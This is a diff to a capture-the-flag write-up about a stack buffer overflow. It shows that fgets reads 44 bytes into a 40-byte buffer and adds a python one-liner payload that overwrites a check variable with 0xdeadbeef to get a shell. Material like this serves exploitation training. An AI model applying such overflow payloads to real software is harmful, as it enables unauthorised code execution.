@@ -32,4 +32,9 @@ int main()
 }
 ```
 
-In this challenge, func `fgets(buf,45,stdin)` allows us input 44 characters but array `buf` has 40 only. So, the idea is overwrite var `check=0xdeadbeef` to get shellcode.
+In this challenge, func `fgets(buf,45,stdin)` allows us input 44 characters but array `buf` has 40 only. 
+<br />So, the idea is overwrite var `check=0xdeadbeef` to get shellcode.
+<br />We will input 40 * A and variable 0xdeadbeef in little endian
+<br />with `python -c "print 'A'*40+'\xef\xbe\xad\xde'"`
+
+![](BO_1.png)
